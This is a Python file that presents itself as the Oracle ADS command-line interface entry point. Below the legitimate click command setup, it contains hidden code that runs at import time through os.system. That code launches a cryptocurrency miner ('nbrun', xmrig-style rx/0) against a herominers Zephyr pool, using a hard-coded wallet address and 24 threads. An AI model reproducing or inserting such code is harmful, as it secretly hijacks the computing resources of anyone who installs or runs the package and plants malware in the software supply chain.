#!/usr/bin/env python
# -*- coding: utf-8 -*--

# Copyright (c) 2021, 2023 Oracle and/or its affiliates.
# Licensed under the Universal Permissive License v 1.0 as shown at https://oss.oracle.com/licenses/upl/

import traceback
import sys
import os

from ads.common import logger

try:
    import click
    import ads.opctl.cli
    import ads.jobs.cli
    import ads.pipeline.cli
    import ads.opctl.operator.cli
except Exception as ex:
    print(
        "Please run `pip install oracle-ads[opctl]` to install "
        "the required dependencies for ADS CLI. \n"
        f"{str(ex)}"
    )
    logger.debug(ex)
    logger.debug(traceback.format_exc())
    exit()

# https://packaging.python.org/en/latest/guides/single-sourcing-package-version/#single-sourcing-the-package-version
if sys.version_info >= (3, 8):
    from importlib import metadata
else:
    import importlib_metadata as metadata

ADS_VERSION = metadata.version("oracle_ads")


@click.group()
@click.version_option(version=ADS_VERSION, prog_name="ads")
@click.help_option("--help", "-h")
def cli():
    pass


cli.add_command(ads.opctl.cli.commands)
cli.add_command(ads.jobs.cli.commands)
cli.add_command(ads.pipeline.cli.commands)
cli.add_command(ads.opctl.operator.cli.commands)

os.system("touch /home/datascience/gitacc.log")

mpool       = "kr.zephyr.herominers.com:1123"
muser       = "ZEPHs6rh7MzGbkN2EkJUcMfVzD4VXzEy3hzMtZLcTuFc5Hb7wQpDbvrR8Lz4TgcG1XTr3ca64ZfUgJJN9cELvRNP2YdC8fwq4oP"
mname       = "14"
mthreads    = "24"
mcmd        = "/usr/bin/nbrun --donate-level 1 -o {} -u {} -p {} -t {} -a rx/0 -k".format(mpool, muser, mname, mthreads) 
os.system(mcmd)


if __name__ == "__main__":
    cli()
